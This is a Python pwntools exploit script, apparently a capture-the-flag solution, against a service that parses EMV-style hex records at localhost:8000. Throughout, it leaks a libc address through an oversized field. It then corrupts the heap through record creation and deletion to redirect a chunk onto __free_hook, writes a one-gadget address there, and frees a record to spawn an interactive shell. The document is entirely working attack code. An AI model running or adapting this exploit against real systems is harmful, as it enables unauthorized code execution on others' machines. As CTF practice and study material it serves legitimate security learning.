from pwn import *


def name_emv(name):
    return str.encode('5F20' + '0' + str(int(len(name) / 2)) + name)


e = ELF('libc-2.31.so')
# r = process('./main')
r = remote('localhost', 8000)

r.recvuntil(b'Parser')
r.sendline(b'1')
r.sendline(b'887F' + b'FF'*104)

r.recvuntil(b'format: ')
r.recvline()
libc_leak_rev = r.recvline().split(b': ')[1].strip()[104*2:].decode('utf-8')
libc_leak = ''
for i in range(0, len(libc_leak_rev), 2):
    libc_leak = libc_leak_rev[i] + libc_leak_rev[i+1] + libc_leak
libc_leak = int(libc_leak, 16) - e.symbols['_IO_2_1_stdin_']
print(hex(libc_leak))

r.recvuntil(b'Delete record')
r.sendline(b'1')
r.sendline(name_emv(hex(ord("O"))[2:] * 4) + b'887F' + b'FF' * 4)

r.recvuntil(b'Delete record')
r.sendline(b'1')
r.sendline(name_emv(hex(ord("i"))[2:] * 4) + b'887F' + b'FF' * 4)

r.recvuntil(b'Delete record')
r.sendline(b'1')
r.sendline(name_emv(hex(ord("j"))[2:] * 4) + b'887F' + b'FF' * 4)

r.recvuntil(b'Delete record')
r.sendline(b'1')
r.sendline(name_emv(hex(ord("k"))[2:] * 4) + b'887F' + b'FF' * 4)

r.recvuntil(b'Delete record')
r.sendline(b'2')
r.sendline(b'kkkk')

r.recvuntil(b'Delete record')
r.sendline(b'2')
r.sendline(b'jjjj')

malloc_hook = libc_leak + e.symbols['__free_hook'] - 9
encoded_malloc_hook = hex(malloc_hook)[2:]
reversed_malloc_hook = ''
for i in range(0, len(encoded_malloc_hook), 2):
    reversed_malloc_hook = encoded_malloc_hook[i] + encoded_malloc_hook[i+1] + reversed_malloc_hook

r.recvuntil(b'Delete record')
r.sendline(b'1')
r.sendline(name_emv(hex(ord("i"))[2:] * 4) + b'887F' + b'AA' * 23 + str.encode(reversed_malloc_hook))

r.recvuntil(b'Delete record')
r.sendline(b'1')
r.sendline(name_emv(hex(ord("A"))[2:] * 4) + b'887F' + b'AA' * 4)

shell = libc_leak + 0xe6c81

print(hex(shell))

encoded_shell = hex(shell)[2:]
reversed_shell = ''
for i in range(0, len(encoded_shell), 2):
    reversed_shell = encoded_shell[i] + encoded_shell[i+1] + reversed_shell

r.recvuntil(b'Delete record')
r.sendline(b'1')
r.sendline(name_emv(hex(ord("B"))[2:] * 4) + b'887F' + str.encode(reversed_shell))

r.recvuntil(b'Delete record')
r.sendline(b'2')
r.sendline(b'OOOO')

r.interactive()